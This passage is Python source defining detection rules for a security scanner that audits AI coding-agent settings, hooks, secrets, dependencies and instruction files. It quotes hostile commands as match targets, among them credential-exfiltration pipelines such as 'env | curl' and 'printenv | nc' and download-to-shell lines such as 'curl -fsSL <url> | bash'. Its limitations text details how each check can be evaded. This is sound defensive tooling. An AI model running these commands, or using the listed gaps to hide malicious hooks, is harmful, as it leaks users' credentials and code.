        "one-liners `python -c ... import requests` (not `python3 -c`) and `node -e "
        "... fetch(`, in the command line of each hook (its `command`, followed by "
        "`args` when set) in `.claude/settings.json` and `.claude/settings.local.json`. "
        "What a script file does is not followed, so `bash .claude/hooks/report.sh` "
        "passes even when the script runs curl. An `http` hook, which posts the event "
        "to its `url` without running a command, is not read, and neither are the "
        "hooks a plugin ships in `hooks/hooks.json`."
    ),
)

_r(
    "AAK-HOOK-002",
    "Hook command contains environment variable exfiltration",
    "A hook command accesses credential environment variables. "
    "This enables direct credential theft via hook execution.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Take the variable out of the hook command. The rule matches `$ANTHROPIC_API_KEY`, "
    "`$OPENAI_API_KEY`, `$AWS_SECRET_ACCESS_KEY` and `$AWS_ACCESS_KEY_ID`, and the "
    "pipelines `env | curl`, `printenv | nc` and `echo $VAR | base64`. Let the program "
    "the hook runs read its own credentials from its environment.",
    sarif_name="HookCredentialExfiltration",
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-02"],
    limitations=(
        "Matches four names written as a bare `$NAME` (ANTHROPIC_API_KEY, "
        "OPENAI_API_KEY, AWS_SECRET_ACCESS_KEY, AWS_ACCESS_KEY_ID) and three "
        "exfiltration pipelines; `$HOME` and `$PATH` are not credentials and are not "
        "reported. The braced form `${ANTHROPIC_API_KEY}` and any "
        "other credential variable on its own (`$GITHUB_TOKEN`) are not matched. An "
        "`http` hook that sends `$ANTHROPIC_API_KEY` in a header it lists in "
        "`allowedEnvVars` is not read, and neither are the hooks a plugin ships in "
        "`hooks/hooks.json`."
    ),
)

_r(
    "AAK-HOOK-003",
    "Hook command writes to files outside project directory",
    "A hook command writes to paths outside the project boundary, "
    "which can modify system configs, plant persistence, or stage exfiltration.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Write only inside the project: use project-relative paths for anything the hook "
    "creates or changes. The rule reports a write to a path under `/tmp`, `~`, `/etc`, "
    "`/var`, `/usr` or `/home`, such as a `>` redirect, `tee`, `cp`, `mv`, `sed -i`, "
    "`curl -o` or `tar`; calling a tool by its absolute path, or reading such a path, "
    "does not fire it.",
    sarif_name="HookWriteOutsideProject",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-ESCAPE-01"],
    limitations=(
        "Reads the hook's command line as shell commands and reports one that writes "
        "a path under /tmp, ~, /etc, /var, /usr or /home: a `>` or `>>` redirect, "
        "`tee`, `mkdir`, `touch`, `chmod`, `chown` or `truncate` on it, the "
        "destination of `cp`, `mv`, `install` or `ln`, `sed -i` or `perl -i`, "
        "`curl -o`, `wget -O` or `-P`, `dd of=`, or `tar` creating or extracting "
        "there, also inside `sh -c` and after `sudo` or `env`. A command that only "
        "names such a path (`cd /tmp/build`, reading `~/.config`) is not reported, "
        "and neither is deleting one. A path reached through `$HOME` or a relative "
        "climb (`../../shared/out.json`) is not matched, nor is a write made by a "
        "script the hook runs. Hooks a plugin ships in `hooks/hooks.json` are not "
        "read."
    ),
)

_r(
    "AAK-HOOK-004",
    "Hook runs a command on tool use, prompt submit or session start",
    "A hook runs a command on PreToolUse, PostToolUse, SessionStart or "
    "UserPromptSubmit, so it runs automatically around tool calls, on every prompt "
    "and at session start. This is an inventory entry, not evidence of harm: the "
    "rule reads only the event and whether the command names a formatter, not what "
    "the command or a script it calls does. Review what it runs.",
    Severity.LOW,
    Category.HOOK_INJECTION,
    "Review what the command runs, including any script it calls. Keep the hooks "
    "you can account for and remove the rest.",
    sarif_name="HookSensitiveLifecycleEvent",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-HOOK-01"],
    limitations=(
        "Fires only for a hook on PreToolUse, PostToolUse, SessionStart or "
        "UserPromptSubmit whose command names none of a list of formatters. The same "
        "command on any other event, such as Stop, is not reported, and a command that "
        "merely contains a formatter name anywhere, even in a trailing comment (`# "
        "prettier`), counts as a formatter. A hook that runs no command (`http`, "
        "`prompt`, `agent`, `mcp_tool`) is not reported on any event, and the hooks a "
        "plugin ships in `hooks/hooks.json` are not read."
    ),
)

_r(
    "AAK-HOOK-005",
    "Hook command uses base64 encoding/decoding",
    "A hook command contains base64 operations, commonly used to obfuscate "
    "exfiltration payloads or encode stolen credentials.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Remove base64 operations from hooks unless there's a documented, legitimate use case.",
    sarif_name="HookBase64Obfuscation",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-OBFUSC-01"],
    limitations=(
        "Matches the words base64, btoa, atob, b64encode and b64decode in a hook "
        "command. Other encodings that hide a payload the same way, hex through `xxd "
        "-r -p` or `base32 -d`, are not matched. Hooks a plugin ships in "
        "`hooks/hooks.json` are not read."
    ),
)

_r(
    "AAK-HOOK-006",
    "Hook command runs with elevated privileges",
    "A hook command uses sudo, doas, pkexec, or chmod +x. "
    "Hooks should never require elevated privileges.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Remove `sudo`, `doas`, `pkexec` and `chmod +x` from the hook command. A hook needs "
    "no elevated rights; to run a script, commit it with its executable bit set (`git "
    "update-index --chmod=+x script.sh`) instead of changing the mode from the hook.",
    sarif_name="HookPrivilegeEscalation",
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-PRIV-01"],
    limitations=(
        "Matches sudo, doas, pkexec and `chmod` followed by whitespace and `+x`. "
        "`chmod 755`, `chmod a+x` and `su root -c`, which grant the same execute or "
        "root rights, are not matched. Hooks a plugin ships in `hooks/hooks.json` are "
        "not read."
    ),
)

_r(
    "AAK-HOOK-007",
    "Excessive number of hooks defined",
    "More than 15 hook definitions in a single settings file. "
    "Large hook surface increases audit burden and risk of hidden malicious hooks.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Remove hooks that are not essential, or fold related ones into one script, until "
    "each settings file has 15 or fewer hooks. The rule counts every hook, each one in "
    "a matcher group's `hooks` array on its own, in `.claude/settings.json` and "
    "`.claude/settings.local.json` separately, and fires above 15.",
    sarif_name="ExcessiveHookCount",
    adversa_references=["ADV-SCOPE-03"],
    limitations=(
        "Counts the hooks of all events in one settings file, each hook in a "
        "`matcher` group's `hooks` array separately, and fires above 15. Hooks split "
        "between `.claude/settings.json` and `.claude/settings.local.json` are not "
        "added up, and the hooks a plugin ships in `hooks/hooks.json` are not counted."
    ),
)

_r(
    "AAK-HOOK-008",
    "Hook command contains obfuscated or encoded payload",
    "A hook command contains hex-encoded strings, unicode escapes, an embedded "
    "base64 blob or nested shell invocations. Obfuscation is a strong indicator of "
    "malicious intent.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Rewrite the hook so its command is plain: remove `\\xNN` and `\\uNNNN` escapes "
    "and nested `sh -c ... sh -c` chains, and replace an embedded base64 blob (64 or "
    "more letters, digits, `+` or `=` in a row, mixing upper case, lower case and "
    "digits) with the command it encodes, or with a script file in the repository "
    "that the hook calls by path, where it can be reviewed. Length alone does not fire "
    "the rule.",
    sarif_name="HookObfuscatedPayload",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-OBFUSC-02"],
    limitations=(
        "Matches `\\x41` and `\\u0041` escapes, `sh -c` twice in one command "
        "(inside `bash -c` too), and an unbroken run of 64 or more letters, digits, "
        "`+` or `=` that mixes upper case, lower case and digits, as base64 does. A "
        "hex digest (an image pinned `@sha256:`) and a long readable command are not "
        "reported, and a base64 blob whose `/` characters split it into runs shorter "
        "than 64 is missed. The same text written as bash octal escapes (`$'\\143\\165\\162\\154'`) or reassembled from "
        "shell variables (`$a$b`) is not matched. Hooks a plugin ships in "
        "`hooks/hooks.json` are not read."
    ),
)

_r(
    "AAK-HOOK-009",
    "Hook command references project source files",
    "A hook command reads or references project source code files, "
    "which could enable code exfiltration.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Remove the `cat`, `head`, `tail`, `less`, `more`, `grep`, `sed` or `awk` call, or "
    "the `<` redirect, that reads a `.py`, `.js`, `.ts`, `.go`, `.rs`, `.java`, `.rb`, "
    "`.c`, `.cpp` or `.h` file in the hook command. If the hook needs the source for a "
    "check, run the project's own linter or formatter on the file instead of reading "
    "its contents.",
    sarif_name="HookReferencesSourceFiles",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-EXFIL-02"],
    limitations=(
        "Matches a file a reader command reads: an operand of cat, head, tail, less or "
        "more, a file operand of grep, sed or awk (never the pattern or program), or a "
        "`< file` redirect, ending in a lower-case .py, .js, .ts, .go, .rs, .java, "
        ".rb, .c, .cpp or .h, also inside `sh -c`. A pattern that names an extension "
        "(`grep '\\.py$'`) is not a read. Archiving or copying source (`tar czf out.tgz src/`, `cp src/main.py "
        "out/`) and reading a file of another type (`cat src/App.tsx`) are not "
        "matched. Hooks a plugin ships in `hooks/hooks.json` are not read."
    ),
)

# ---------------------------------------------------------------------------
# Trust Boundary Violations (7 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TRUST-001",
    "enableAllProjectMcpServers is true",
    "Auto-approves ALL MCP servers in .mcp.json without user consent. "
    "A compromised repo can ship arbitrary MCP servers that execute immediately.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "Set to false. Use enabledMcpjsonServers to whitelist specific servers by name.",
    sarif_name="EnableAllProjectMcpServers",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-TRUST-01"],
    auto_fixable=True,
    limitations=(
        "Reads `.claude/settings.json` and `.claude/settings.local.json` at the root "
        "of the scanned directory. The same flag in the settings file of a "
        "subdirectory (`packages/web/.claude/settings.json`) is not read."
    ),
)

_r(
    "AAK-TRUST-002",
    "ANTHROPIC_BASE_URL overridden in project settings",
    "Redirects all API traffic (including API keys) to attacker-controlled endpoint "
    "BEFORE trust prompt displays. This is the exact attack vector of CVE-2026-21852.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "NEVER override ANTHROPIC_BASE_URL in project settings. Only set in user-level or system environment.",
    sarif_name="AnthropicBaseUrlOverride",
    cve_references=["CVE-2026-21852"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-REDIRECT-01"],
    limitations=(
        "Parses `env.ANTHROPIC_BASE_URL` in `.claude/settings.json` and "
        "`.claude/settings.local.json` at the root of the scanned directory and accepts "
        "it when the host is `anthropic.com` or a subdomain of it, whatever the "
        "scheme, so a cleartext `http://api.anthropic.com/v1` passes. The same "
        "override in the settings file of a subdirectory "
        "(`packages/web/.claude/settings.json`) is not read."
    ),
)

_r(
    "AAK-TRUST-003",
    "Wildcard or overly broad permission allows",
    "Permission allow patterns use wildcards (*, **) or broad tool names. "
    "This bypasses the permission system, allowing unchecked tool execution.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Use narrowest possible permission patterns. Specify exact tool names and path constraints.",
    sarif_name="WildcardPermissionAllow",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-04"],
    limitations=(
        "Matches only the exact strings `*` (or any run of asterisks), `mcp__*`, "
        "`Bash(*)`, `Edit(**)`, `Read(**)` and `Write(**)` in `permissions.allow`. A "
        "bare tool name (`Bash`) or a prefix grant (`Bash(sudo:*)`) is not matched."
    ),
)

_r(
    "AAK-TRUST-004",
    "No deny rules defined",
    "Settings file has permission allows but empty or missing deny rules. "
    "Defense-in-depth requires explicit deny rules for sensitive operations.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Add deny rules for: file system operations outside project, network tools, credential-accessing tools.",
    sarif_name="MissingDenyRules",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-TRUST-02"],
    auto_fixable=True,
    limitations=(
        "Fires when `permissions.allow` has entries and `permissions.deny` is empty or "
        "missing. Any non-empty deny list clears it, whatever it denies: "
        "`Read(./docs/notes.md)` beside `Bash(curl:*)` passes."
    ),
)

_r(
    "AAK-TRUST-005",
    "Custom API base URL for any provider",
    "An environment variable matching *_BASE_URL, *_API_URL, or *_ENDPOINT is set "
    "in project settings. This can redirect authenticated traffic to attacker-controlled servers.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Set API URLs only in user-level configuration or system environment variables.",
    sarif_name="CustomApiBaseUrlOverride",
    cve_references=["CVE-2026-21852"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-REDIRECT-02"],
    limitations=(
        "Matches `env` names that end in `_BASE_URL`, `_API_URL` or `_ENDPOINT`. Other "
        "spellings that point a client at another server (`OPENAI_API_BASE`, "
        "`LLM_GATEWAY_URL`) are not matched."
    ),
)

_r(
    "AAK-TRUST-006",
    "Project settings may override user deny rules",
    "Project settings have permission allows that could shadow user-level deny rules. "
    "Misconfigurations can create a false sense of security.",
    Severity.MEDIUM,
    Category.TRUST_BOUNDARY,
    "Audit that project allows don't re-enable operations the user intended to block.",
    sarif_name="ProjectOverridesUserDeny",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-TRUST-03"],
    limitations=(
        "Counts an allow entry only when its text contains Bash, Edit, Write, Read or "
        "`mcp__`. Allowing `WebFetch` or `Task` with no deny list is not reported."
    ),
)

_r(
    "AAK-TRUST-007",
    "No MCP server allowlist configured",
    "No enabledMcpjsonServers allowlist is configured, meaning server approval "
    "relies entirely on user prompts.",
    Severity.MEDIUM,
    Category.TRUST_BOUNDARY,
    "Configure enabledMcpjsonServers with explicit server names.",
    sarif_name="NoMcpServerAllowlist",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-TRUST-04"],
    auto_fixable=True,
    limitations=(
        "Fires only when a settings file at the root of the scanned directory sits "
        "beside a root `.mcp.json`. A package directory that carries its own "
        "`.claude/settings.json` and `.mcp.json` (`packages/web/`) is not looked at."
    ),
)

# ---------------------------------------------------------------------------
# API Key & Secret Exposure (9 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-SECRET-001",
    "Anthropic API key exposed",
    "An Anthropic API key (sk-ant-*) was found in a project file. "
    "This allows full API access and billing abuse.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove key, rotate immediately, use environment variables.",
    sarif_name="AnthropicApiKeyExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-03"],
    limitations=(
        "Looks for `sk-ant-` followed by 20 or more key characters in files whose "
        "extension is on a fixed list (`.json`, `.yml`, `.toml`, `.py`, `.ts`, `.sh` "
        "and similar, plus `.env` files and Dockerfiles). A key in any other kind of "
        "file is not reported: one pasted into a Jupyter notebook (`.ipynb`) is "
        "missed, although the same content in a `.json` file is found."
    ),
)

_r(
    "AAK-SECRET-002",
    "OpenAI API key exposed",
    "An OpenAI API key was found in a project file: a legacy user key (sk-*), or a "
    "project (sk-proj-*), service-account (sk-svcacct-*) or admin (sk-admin-*) key.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove key, rotate immediately, use environment variables.",
    sarif_name="OpenaiApiKeyExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-04"],
    limitations=(
        "Looks for the `sk-` shapes OpenAI issues: legacy user keys and the "
        "`sk-proj-`, `sk-svcacct-` and `sk-admin-` families. A key with no such prefix "
        "is not recognised, so an Azure OpenAI key, which is 32 hexadecimal "
        "characters, is not reported, although an `sk-proj-` key in the same place is."
    ),
)

_r(
    "AAK-SECRET-003",
    "AWS credentials exposed",
    "AWS access key ID or secret access key found in a project file.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Delete the access key from the file and deactivate or rotate it in IAM, since it "
    "is exposed once committed. Then use an IAM role, AWS SSO or a secrets manager so "
    "that no static key is needed.",
    sarif_name="AwsCredentialsExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-05"],
    limitations=(
        "Looks for an `AKIA` access key ID and for a secret key written as the "
        "lower-case assignment `aws_secret_access_key = <40 characters>`. The same "
        "secret as the upper-case environment variable, `AWS_SECRET_ACCESS_KEY=<40 "
        "characters>`, is not reported, so a file that holds the secret without its "
        "key ID is missed."
    ),
)

_r(
    "AAK-SECRET-004",
    "Generic high-entropy secret",
    "A value assigned to a secret-like key has high Shannon entropy, "
    "indicating a likely credential or API key.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Move to environment variables or secrets manager.",
    sarif_name="GenericHighEntropySecret",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-06"],
    limitations=(
        "Reads `NAME=value` pairs and quoted values (`\"NAME\": \"value\"`) whose name "
        "contains SECRET, PASSWORD, TOKEN, KEY or CREDENTIAL, and reports a value of "
        "16 or more characters whose Shannon entropy exceeds 4.5 bits per character. A "
        "secret drawn from a small alphabet cannot reach that: a 64-digit hexadecimal "
        "secret, such as the output of `openssl rand -hex 32`, tops out at 4 bits per "
        "character and is never reported."
    ),
)

_r(
    "AAK-SECRET-005",
    "Private key file present",
    "A private key file (*.pem, *.key, id_rsa, etc.) or PEM content was found in the project.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove private keys from repository, add to .gitignore.",
    sarif_name="PrivateKeyFilePresent",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-07"],
    limitations=(
        "Reports a private key by its file name (a `.pem`, `.key`, `.p12` or `.pfx` "
        "extension, or exactly `id_rsa`, `id_ed25519`, `id_ecdsa` or `id_dsa`) or by a "
        "PEM private-key header at the top of a `.crt` or `.cer` file. The same key "
        "pasted into any other file, such as a YAML deploy config, is not reported."
    ),
)

_r(
    "AAK-SECRET-006",
    ".env file not in .gitignore",
    "A .env file exists but .gitignore does not contain a .env exclusion pattern.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Add .env* to .gitignore.",
    sarif_name="EnvFileNotInGitignore",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-08"],
    auto_fixable=True,
    limitations=(
        "Looks for `.env` and `.env.*` files in the project root only. An env file in "
        "a subdirectory, such as `services/api/.env.example` in a monorepo, is not "
        "examined, even when the project has no `.gitignore` at all."
    ),
)

_r(
    "AAK-SECRET-007",
    "Secret in MCP server environment block",
    "Hardcoded secret values found in mcpServers env blocks in non-.mcp.json files.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Replace the literal with a host-resolved environment reference of the same name — "
    'the `env` value becomes `"GITHUB_TOKEN": "${GITHUB_TOKEN}"` — then export the '
    "variable from your shell or secrets manager before starting the server. That form "
    "is what MCP hosts already resolve: 158 env values across the 748 public configs in "
    "this project's corpus use it. Rotate the exposed value as well: it was readable in "
    "a config file, so treat it as compromised regardless of what the file now says. "
    "`agent-audit-kit fix` performs the substitution (the variable name is already the "
    "JSON key, so the edit has one correct form); it is deliberately excluded from "
    "`suggest --auto-pr`, because the server will not start until the variable is "
    "exported and AAK cannot see whether that is safe in your deployment.",
    sarif_name="SecretInMcpEnvBlock",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-09"],
    auto_fixable=True,
    limitations=(
        "Reads the `env` block of each server under a top-level `mcpServers` key in "
        "JSON files other than `.mcp.json`, and reports a hard-coded value whose "
        "variable name contains KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL, ANTHROPIC, "
        "OPENAI or AWS_. The name alone decides: a credential under any other name, "
        "such as a `DATABASE_URL` that carries `user:password@host`, is not reported."
    ),
)

_r(
    "AAK-SECRET-008",
    "GitHub/GitLab personal access token exposed",
    "A GitHub or GitLab personal access token (ghp_*, github_pat_*, glpat-*) was found in a project file.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove token, rotate immediately, use environment variables.",
    sarif_name="GitTokenExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-10"],
    limitations=(
        "Reads GitHub personal access tokens (`ghp_` classic, `github_pat_` "
        "fine-grained) and GitLab `glpat-` tokens. GitHub's other token types are not "
        "reported: OAuth (`gho_`), GitHub App user (`ghu_`) and installation (`ghs_`), "
        "and refresh (`ghr_`) tokens."
    ),
)

_r(
    "AAK-SECRET-009",
    "Google Cloud service account key file",
    "A Google Cloud service account key JSON file was found in the project.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove key file, use workload identity or environment-based auth.",
    sarif_name="GcpServiceAccountKey",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-11"],
    limitations=(
        "Reports a file with a `.json` extension that contains `\"type\": "
        "\"service_account\"`. The same key saved under another extension, such as "
        "`.yml`, is not reported."
    ),
)

# ---------------------------------------------------------------------------
# Dependency Supply Chain (6 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-SUPPLY-001",
    "MCP server package not pinned to exact version",
    "MCP server args contain package names without @x.y.z version pinning. "
    "Unpinned packages fetch latest at runtime, vulnerable to rug pull attacks.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Pin to exact version. Example: @modelcontextprotocol/server-filesystem@2025.1.1",
    sarif_name="McpPackageNotPinned",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-03"],
    limitations=(
        "Reads the top-level `mcpServers` and `servers` maps of .mcp.json, "
        ".cursor/mcp.json, .vscode/mcp.json, .amazonq/mcp.json and mcp.json at the "
        "project root, comments and trailing commas included as VS Code allows "
        "them, for the launchers npx, uvx, bunx and pnpx, and reports each "
        "package spec that is not an exact version or a commit, a floating tag "
        "(`@latest`) or a range (`@^1.0.0`, `>=1`) included. A launcher outside "
        "those four is not read, whether another fetcher (`pnpm dlx "
        "some-mcp-server`) or npx behind a shell (`cmd /c npx -y some-mcp-server`), "
        "nor is a `docker run` image tagged `latest`."
    ),
)

_r(
    "AAK-SUPPLY-002",
    "Known vulnerable package in lockfile",
    "A package with known MCP/AI-agent-related vulnerabilities was found in the dependency tree.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade the package named in the finding to a release outside its affected range "
    "(currently axios 1.7.4 or later, openclaw 2.1.0 or later), or remove it. A "
    "'Potential typosquat' finding is a name check: confirm the package is the one you "
    "meant to install, and replace it with the real package if it is not.",
    sarif_name="KnownVulnerablePackage",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-04"],
    limitations=(
        "Reads the root package-lock.json against a fixed table of two npm packages, "
        "`axios` 1.7.0 to 1.7.3 and `openclaw` below 2.1.0, plus three typosquat "
        "name patterns, so a vulnerable version of any other package (`lodash` "
        "4.17.15 in a lockfile) is not reported. The table lists no PyPI package or "
        "crate (the PyPI `openclaw` is an unrelated installer for the cmdop CLI), so "
        "requirements*.txt, Pipfile.lock and Cargo.lock report nothing. yarn.lock, "
        "pnpm-lock.yaml, a package-lock.json in a sub-directory and a lockfile over "
        "32 MiB are not read."
    ),
)

_r(
    "AAK-SUPPLY-003",
    "Dependency uses install scripts",
    "package.json has install scripts (preinstall, postinstall, etc.) that execute "
    "arbitrary commands during npm install.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Audit install scripts. Use --ignore-scripts flag and run scripts manually after review.",
    sarif_name="DangerousInstallScripts",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-SUPPLY-05"],
    limitations=(
        "Reads the `preinstall`, `install`, `postinstall` and `prepare` scripts of "
        "the root package.json only, and reports one that names the whole word "
        "curl, wget, fetch, nc, ncat, ssh, http, axios or request, or that does not "
        "start with a known build tool. A script that starts with `node`, `npx`, "
        "`tsc`, `webpack`, `rollup`, `esbuild` or `vite` is treated as safe, so "
        "`npx --yes some-unreviewed-package` passes, and so does `node -e "
        "\"require('https').get(...)\"`, because `https` is not the word `http`. The "
        "install scripts of dependencies (a lockfile entry marked "
        "`hasInstallScript`) and of a workspace package.json in a sub-directory are "
        "not read."
    ),
)

_r(
    "AAK-SUPPLY-004",
    "No lockfile present",
    "A package manifest exists but no lockfile was found. "
    "Without lockfiles, dependency versions float and can be silently updated.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Generate the lockfile for the manifest named in the finding and commit it: `npm "
    "install` (`package-lock.json`), `yarn` or `pnpm install`, `uv lock`, `poetry "
    "lock`, `pdm lock`, `pipenv lock` or `cargo generate-lockfile`.",
    sarif_name="NoLockfilePresent",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-06"],
    limitations=(
        "Checks the project root only: a package.json needs a package-lock.json, "
        "yarn.lock, pnpm-lock.yaml or bun.lockb, a pyproject.toml needs a "
        "poetry.lock, uv.lock, Pipfile.lock or pdm.lock, a Pipfile needs a "
        "Pipfile.lock and a Cargo.toml needs a Cargo.lock. A lockfile only has to "
        "exist, so an empty one passes, a Python project that declares its "
        "dependencies in requirements.txt alone is not checked, and neither is a "
        "manifest in a sub-directory."
    ),
)

_r(
    "AAK-SUPPLY-005",
    "Dependency count exceeds threshold",
    "More than 200 direct + transitive dependencies in lockfile. "
    "Each dependency is a trust decision.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Remove unused dependencies, or swap heavy ones for lighter ones, until the "
    "lockfile lists 200 or fewer packages. The rule counts every entry in "
    "`package-lock.json` or `Cargo.lock`, transitive dependencies included.",
    sarif_name="ExcessiveDependencyCount",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-07"],
    limitations=(
        "Counts the entries of the root package-lock.json, the root package itself "
        "included, and the packages of the root Cargo.lock, and reports more than "
        "200. A uv.lock or yarn.lock of any size and a package-lock.json in a "
        "sub-directory are not counted. A lockfile over 32 MiB is not counted."
    ),
)

_r(
    "AAK-SUPPLY-006",
    "Dependency with known MCP-specific vulnerability",
    "A dependency has a known vulnerability specifically affecting MCP/agent tooling.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Change the package version in the server's `args` to one outside the affected "
    "range recorded in the vulnerability database (currently axios 1.7.4 or later, "
    "openclaw 2.1.0 or later), and pin it exactly.",
    sarif_name="McpSpecificVulnDep",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
    limitations=(
        "Reads the `args` of the `mcpServers` entries in the root .mcp.json only, "
        "and looks each `package@version` up in the npm section of the vulnerability "
        "database, which bundles two packages: `axios` 1.7.0 to 1.7.3 and `openclaw` "
        "below 2.1.0. The same package in package.json or in an MCP config under "
        "`.cursor/` or `.vscode/` is not read, and neither is a package that states "
        "no version."
    ),
)

# ---------------------------------------------------------------------------
# Agent Config (5 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-AGENT-001",
    "Agent instruction file contains shell command directives",
    "An agent instruction file (`AGENTS.md`, `CLAUDE.md`, `.cursorrules` and "
    "friends) tells the agent to run code it downloads, or to delete the "
    "filesystem root or a home directory: `curl -fsSL <url> | bash`, "
    "`bash -c \"$(curl -fsSL <url>)\"`, `iex ((New-Object "
    "Net.WebClient).DownloadString(<url>))`, `rm -rf ~`. The file is read as "
    "instructions, so whatever the far end serves at the time runs with the "
    "agent's permissions.\n\n"
    "Until 0.6.15 this rule was a keyword match (`subprocess`, `eval(`, "
    "`exec(`, `sh -c`, any `rm -rf`, any `curl ... | sh`). On the 909 public "
    "repositories of the #771 corpus it fired on 74, nearly all of them on a "
    "mention: a guardrail such as \"Never use `eval()`\", a deny-list row, a "
    "code sample, `rm -rf dist`. It reports the command now, not the word "
    "(#869).",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Do not tell the agent to pipe a download into a shell. Install from a "
    "package manager, or download the script to a file, check its checksum or "
    "signature, and run the local copy. Remove destructive commands from "
    "instruction files.",
    sarif_name="AgentShellDirectives",
    owasp_agentic_references=["ASI01", "ASI05"],
    adversa_references=["ADV-HIJACK-01"],
    limitations=(
        "Reads one line at a time. A download counts when it is piped into an "
        "interpreter, run through `$(...)` or `<(...)`, or handed to PowerShell's "
        "`iex`, and the command names what it fetches (a URL, a `$VARIABLE` or a "
        "host); an interpreter given its code on the command line "
        "(`| python3 -m json.tool`) reads the download as data, and a loopback "
        "URL is a local API. A recursive `rm` counts when it targets `/`, `~` or "
        "`$HOME` where a command starts. A command a guardrail forbids is not "
        "reported: one negated in the sentence, one under a heading or lead-in "
        "such as \"### NEVER\", or one in a table row. `eval(`, `exec(`, "
        "`subprocess` and `sh -c` on their own, commands split across lines, and "
        "other destructive commands (`mkfs`, `dd`) are not reported."
    ),
)

_r(
    "AAK-AGENT-002",
    "Agent instruction file links an external host",
    "An agent instruction file (`CLAUDE.md`, `AGENTS.md`, `.cursorrules` and "
    "friends) links a host outside the documentation allowlist. This is "
    "inventory, not an incident: the link is one more thing an agent reading "
    "the file may be pointed at, and worth a look when you are auditing what a "
    "repository tells its agent to consult. It is not evidence of anything on "
    "its own.\n\n"
    "This rule was HIGH until 2026-09-25 and fired on any link outside a prefix "
    "allowlist. Reported against 930 public repositories shipping `AGENTS.md` / "
    "`CLAUDE.md`: it fired on 303, so roughly a third failed `--ci` for "
    "carrying a documentation link. A severity that high on something that "
